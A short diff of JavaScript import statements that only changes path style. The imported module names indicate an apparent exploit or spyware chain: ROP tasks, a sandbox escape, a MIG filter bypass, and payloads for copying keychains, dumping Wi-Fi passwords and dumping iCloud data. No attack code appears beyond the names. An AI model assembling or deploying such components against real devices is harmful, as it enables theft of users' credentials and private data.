@@ -1,19 +1,19 @@
-import Native from "./libs/Chain/Native.js";
-import Chain from "./libs/Chain/Chain.js";
-import TaskRop from "./libs/TaskRop/TaskRop.js";
-import Task from "./libs/TaskRop/Task.js";
-import Sandbox from "./libs/TaskRop/Sandbox.js";
-import Utils from "./libs/JSUtils/Utils.js";
-import InjectJS from "./InjectJS.js";
-import Driver from "./libs/Driver/Driver.js";
-import RemoteCall from "./libs/TaskRop/RemoteCall.js";
-import MigFilterBypassThread from "./MigFilterBypassThread.js";
-import loaderCode from "!raw-loader!./loader.js";
-import fileDownloaderCode from "!raw-loader!./file_downloader.js";
-import keychainCopierCode from "!raw-loader!./keychain_copier.js";
-import wifiDumpCode from "!raw-loader!./wifi_password_dump.js";
-import wifiDumpSecuritydCode from "!raw-loader!./wifi_password_securityd.js";
-import iCloudDumperCode from "!raw-loader!./icloud_dumper.js";
+import Native from "libs/Chain/Native";
+import Chain from "libs/Chain/Chain";
+import TaskRop from "libs/TaskRop/TaskRop";
+import Task from "libs/TaskRop/Task";
+import Sandbox from "libs/TaskRop/Sandbox";
+import Utils from "libs/JSUtils/Utils";
+import InjectJS from "./InjectJS";
+import Driver from "libs/Driver/Driver";
+import RemoteCall from "libs/TaskRop/RemoteCall";
+import MigFilterBypassThread from "./MigFilterBypassThread";
+import loaderCode from "!raw-loader!loader";
+import fileDownloaderCode from "!raw-loader!./file_downloader";
+import keychainCopierCode from "!raw-loader!./keychain_copier";
+import wifiDumpCode from "!raw-loader!./wifi_password_dump";
+import wifiDumpSecuritydCode from "!raw-loader!./wifi_password_securityd";
+import iCloudDumperCode from "!raw-loader!./icloud_dumper";
 
 
 
